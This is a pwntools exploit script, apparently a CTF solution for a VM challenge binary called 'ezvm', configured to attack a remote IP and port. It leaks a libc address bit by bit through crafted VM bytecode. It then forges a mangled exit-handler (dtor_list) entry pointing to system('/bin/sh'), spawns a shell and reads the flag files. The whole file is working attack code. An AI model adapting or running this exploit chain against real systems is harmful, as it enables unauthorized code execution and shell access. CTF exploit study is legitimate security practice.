#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF("./ezvm_patched")
libc = ELF("./libc-2.35.so")

# shortcuts
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

#host, port = "202.120.7.210", "40241"
host, port = "47.252.3.1", "40241"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

sla('Welcome', '')
sla('code size:','38')
sla('memory count', '256')
sla('code:\n', b'\x17'+b'\xff'*36)

sla('continue?', 'continue')
leak = 0
#Â leak libc value bit by bit (we assume that first 5 bits are zeroes (which is the case for main_arena address)
for i in range(5,40,1):
  print('leaking bit '+str(i))
  code = b'\x16\x00'+p64(0)	# load data mem offset 0 to r0 (will contain a main_arena value on second round)
  code += b'\x00\x00'	# push r0
  code += b'\x14\x01'+p64(1<<i)		# load bit maks in r1
  code += b'\x00\x01'	# push r1
  code += b'\x09'			# logical AND on two stacks value, they will be poped and result put instead
  code += b'\x10'+p64(1)		# jump to offset +1 (pass over bad instruction) if result is 0
  code += b'\x18\x17'			# one bad instruction \x18  and exit instruction \x17
  sla('code size:\n', str(len(code)) )
  sla('memory count:', '256')
  sla('code:', code)
  buff = p.recvuntil('finish', drop=True)
  print(buff.strip())
  if b'what' in buff:
    leak |= (1<<i)
# we assume upper bits are 0x7f
leak |= 0x7f0000000000

print('leak = '+hex(leak))
libc.address = leak - 0x219ce0
print('libc base = '+hex(libc.address))

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

size = 0x2000000000030000
sla('code size:','100')
# create a fake dtor_list entry to get code execution at exit
sla('memory count', str(size))
code = b'\x15\x00'+p64(0x302ec)  # clear rand val
code += b'\x14\x00'+p64(libc.address - 0x2a00)
code += b'\x15\x00'+p64(0x302db)  # rbp val
dest = rol(libc.sym['system'],0x11,64)
code += b'\x14\x00'+p64(dest)
code += b'\x15\x00'+p64(0x302be)  # rbp val
code += b'\x14\x00'+p64(next(libc.search('/bin/sh')))
code += b'\x15\x00'+p64(0x302bf)  # rbp val
code += b'\x17'
sl(code)

# now we exit
sla('continue?', 'bye bye\x00')
# and enjoy shell
p.sendline('id; cat flag*;')
p.interactive()

